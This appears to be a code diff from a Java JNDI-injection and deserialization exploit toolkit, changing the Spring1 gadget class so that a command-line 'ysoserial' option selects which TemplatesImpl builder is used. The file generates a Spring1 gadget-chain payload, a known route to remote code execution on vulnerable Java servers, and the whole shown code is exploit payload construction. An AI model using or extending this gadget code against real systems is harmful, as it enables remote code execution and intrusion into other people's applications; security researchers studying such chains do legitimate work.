@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.springframework.beans.factory.ObjectFactory;
@@ -13,6 +14,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
+import static com.qi4l.jndi.Starter.cmdLine;
 import static java.lang.Class.forName;
 
 /**
@@ -48,7 +50,12 @@ import static java.lang.Class.forName;
 public class Spring1 implements ObjectPayload<Object>{
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(type,param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
 
         final ObjectFactory objectFactoryProxy =
                 Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
